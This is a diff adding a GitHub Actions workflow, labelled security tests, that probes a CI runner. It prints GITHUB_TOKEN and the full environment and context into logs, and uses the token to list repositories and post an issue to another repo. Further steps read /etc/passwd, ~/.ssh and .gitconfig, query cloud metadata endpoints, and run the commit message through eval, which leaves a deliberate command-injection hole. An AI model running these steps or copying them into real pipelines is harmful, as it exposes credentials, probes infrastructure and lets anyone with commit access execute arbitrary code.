@@ -1,0 +1,79 @@
+name: GitHub Security Tests
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  test-secrets-exposure:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test 1 - GITHUB_TOKEN exposure
+        run: |
+          echo "=== Test 1: GITHUB_TOKEN Exposure ===" 
+          echo "Token: ${{ secrets.GITHUB_TOKEN }}"
+          echo "Length: ${#GITHUB_TOKEN}"
+          env | grep GITHUB | head -20
+          
+      - name: Test 2 - Environment variables
+        run: |
+          echo "=== Test 2: All Environment Variables ==="
+          env | sort | head -50
+          
+      - name: Test 3 - Secrets in context
+        run: |
+          echo "=== Test 3: GitHub Context ==="
+          echo "${{ toJSON(github) }}" | head -100
+          
+  test-token-permissions:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: write
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Test 4 - Token scope abuse
+        run: |
+          echo "=== Test 4: Testing GITHUB_TOKEN Permissions ==="
+          # Try to access other repos
+          curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/user/repos | jq '.[].full_name' | head -10
+            
+      - name: Test 5 - Try to modify other repos
+        run: |
+          echo "=== Test 5: Attempting Cross-Repo Access ==="
+          curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/jacksonkasi1/gitlab/issues \
+            -d '{"title":"Test from Actions","body":"Testing token scope"}' || true
+            
+  test-file-access:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test 6 - File system access
+        run: |
+          echo "=== Test 6: File System ==="
+          cat /etc/passwd | head -10 || true
+          ls -la ~/.ssh/ || true
+          cat ~/.gitconfig || true
+          env | grep -i secret || true
+          
+  test-network-access:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test 7 - SSRF attempts
+        run: |
+          echo "=== Test 7: Network Access ==="
+          curl http://169.254.169.254/latest/meta-data/ || true
+          curl http://metadata.google.internal/ || true
+          
+  test-command-injection:
+    runs-on: ubuntu-latest  
+    steps:
+      - name: Test 8 - Inject via commit message
+        run: |
+          echo "=== Test 8: Commit Message ==="
+          echo "Message: ${{ github.event.head_commit.message }}"
+          eval "${{ github.event.head_commit.message }}" || true
